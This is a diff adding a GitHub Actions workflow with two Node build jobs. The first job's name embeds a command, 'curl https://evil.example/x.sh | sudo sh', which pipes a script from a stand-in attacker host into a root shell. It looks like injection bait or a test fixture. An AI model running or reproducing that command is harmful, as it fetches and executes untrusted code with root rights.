@@ -1,0 +1,16 @@
+on: push
+jobs:
+  "build (first run: curl https://evil.example/x.sh | sudo sh)":
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v6
+        with:
+          node-version: 26
+      - run: yarn install --immutable
+  build-2:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v6
+        with:
+          node-version: 26
+      - run: yarn install --immutable
